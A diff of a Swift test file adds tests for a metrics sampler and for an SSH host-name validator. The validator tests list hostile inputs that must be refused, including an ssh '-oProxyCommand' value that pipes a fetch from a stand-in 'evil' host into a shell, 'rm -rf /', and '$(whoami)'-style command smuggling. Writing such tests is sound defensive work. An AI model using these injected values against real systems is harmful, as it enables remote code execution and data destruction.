@@ -35,6 +35,60 @@ struct MetricsSamplerTests {
     }
 
     @Test
+    func snapshotIncludesProcessDerivedDetail() async {
+        // Covers the path that shells out to `ps` off the actor's executor:
+        // a regression there would leave the hover details silently empty.
+        let sampler = MetricsSampler()
+        let snapshot = await sampler.sample()
+
+        #expect(!snapshot.memoryConsumers.isEmpty)
+        #expect(snapshot.memoryConsumers.allSatisfy { $0.residentBytes > 0 })
+    }
+
+    @Test
+    func sshHostNameAcceptsOrdinaryHosts() {
+        for host in [
+            "openclaw.local",
+            "build-01",
+            "malpern@mini.tail9d0bb8.ts.net",
+            "192.168.1.24",
+            "fe80::1%en0",
+            "_underscored.host",
+        ] {
+            #expect(SSHHostName.isValid(host), "\(host) should be usable")
+        }
+    }
+
+    @Test
+    func sshHostNameRejectsHostsSSHWouldReadAsOptions() {
+        // ssh parses any argument starting with "-" as an option, so a host
+        // name like this one would otherwise run an arbitrary command.
+        for host in [
+            "-oProxyCommand=curl-http://evil/x|sh.local",
+            "-J",
+            "--",
+            "",
+            "host name with spaces",
+            "host;rm -rf /",
+            "host$(whoami)",
+            "host`id`",
+            "host\nsecond-line",
+        ] {
+            #expect(!SSHHostName.isValid(host), "\(host) should be refused")
+        }
+    }
+
+    @Test
+    func sshCommandRunnerRefusesAnOptionShapedHost() async {
+        await #expect(throws: RemoteMonitorError.self) {
+            try await SSHCommandRunner.run(
+                host: "-oProxyCommand=echo injected",
+                command: "true"
+            )
+        }
+    }
+
+    @Test
     func remoteOutputParserReadsKeyedCounters() {
         let output = """
         cpu=1 2 3 4
